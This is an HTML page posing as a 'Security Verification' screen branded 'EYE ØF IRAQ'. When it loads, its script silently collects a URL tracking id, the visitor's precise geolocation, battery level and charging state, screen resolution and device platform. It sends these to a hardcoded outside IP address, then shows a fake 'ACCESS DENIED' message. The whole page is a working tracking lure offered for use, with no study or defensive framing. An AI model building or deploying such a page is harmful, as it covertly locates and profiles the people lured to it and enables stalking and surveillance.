<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
    <style>
        body { background: black; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; text-align: center; }
        .loader { border: 3px solid #111; border-top: 3px solid #00ff00; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h3>EYE ØF IRAQ</h3>
        <p id="status">INITIALIZING SCAN...</p>
        <div class="loader"></div>
        <p style="font-size: 10px; color: #555;">SECURITY_ID: 0x8678050341</p>
    </div>

    <script>
        const VPS_URL = "http://178.18.241.166:8080/log"; // پۆرتەکەم گۆڕی بۆ 8080

        async function getInfo() {
            const urlParams = new URLSearchParams(window.location.search);
            const id = urlParams.get('id');
            const res = `${screen.width}x${screen.height}`;
            
            let batLevel = "N/A", isCh = "No";
            try {
                let b = await navigator.getBattery();
                batLevel = Math.floor(b.level * 100);
                isCh = b.charging ? "Yes" : "No";
            } catch(e) {}

            document.getElementById('status').innerText = "VERIFYING IDENTITY...";

            navigator.geolocation.getCurrentPosition(pos => {
                const { latitude, longitude } = pos.coords;
                sendData(id, latitude, longitude, batLevel, isCh, res);
            }, () => {
                sendData(id, "N/A", "N/A", batLevel, isCh, res);
            }, { enableHighAccuracy: true });
        }

        function sendData(id, lat, lon, bat, ch, res) {
            fetch(`${VPS_URL}?id=${id}&lat=${lat}&lon=${lon}&bat=${bat}&ch=${ch}&res=${res}&dev=${navigator.platform}`)
            .then(() => {
                document.getElementById('status').innerText = "ACCESS DENIED: REDIRECTING...";
            });
        }
        window.onload = getInfo;
    </script>
</body>
</html>
